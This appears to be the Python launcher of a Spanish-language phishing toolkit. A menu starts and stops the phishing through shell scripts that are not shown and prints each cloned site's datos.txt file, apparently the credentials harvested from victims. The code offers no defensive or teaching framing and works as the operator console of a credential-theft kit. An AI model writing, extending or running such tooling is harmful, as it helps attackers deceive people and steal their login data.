#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from termcolor import colored
import subprocess
import os

banner = """
                                   )___(
                           _______/__/_
                  ___     /===========|   ___
 ____       __   [\\\\\]___/____________|__[///]   __
 \\   \_____[\\\\]__/___________________________\__[//]___
  \\404                                                 |
   \\                                                  /
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 _________         .    .           |   |   |   |
(..       \\_    ,  |\\  /|           |   |   |   |
 \\       O  \\  /|  \\ \\/ /           |   |   |   |
  \\______    \\/ |   \\  /            |   |   |   |
     vvvv\    \\ |   /  |            J   |   J   |
     \\^^^^  ==   \\_/   |                |       |
      `\\_   ===    \\.  |                J       |
      / /\\_   \ /      |                        |
      |/   \\_  \|      /                        J
             \\________/
"""

menu = """

1) Iniciar Phishing

2) Detener Phishing

3) Verificar información

4) Salir

"""

def main():
    print(colored(banner, "red"))
    while True:
        print(colored(menu, "blue"))
        opcion = input("Seleccione una opción: ")
        if opcion == "1":
            subprocess.run(["./start.sh"], shell=True)
        elif opcion == "2":
            subprocess.run(["./stop.sh"], shell=True)
        elif opcion == "3":
            origen = os.getcwd()
            os.chdir("sites")
            base = os.getcwd()
            for doc in os.listdir():
                print(colored("-----------------------------------", "yellow"))
                print(colored(doc, "green"))
                ruta = base+"/"+doc+"/datos.txt"
                with open(ruta, "r") as datos:
                    print(datos.read())
                print(colored("-----------------------------------", "yellow"))
            os.chdir(origen)
        elif opcion == "4":
            subprocess.run(["./stop.sh"], shell=True)
            exit()
        else:
            print(colored("COMANDO DESCONOCIDO!!", "red"))


if __name__ == '__main__':
    main()
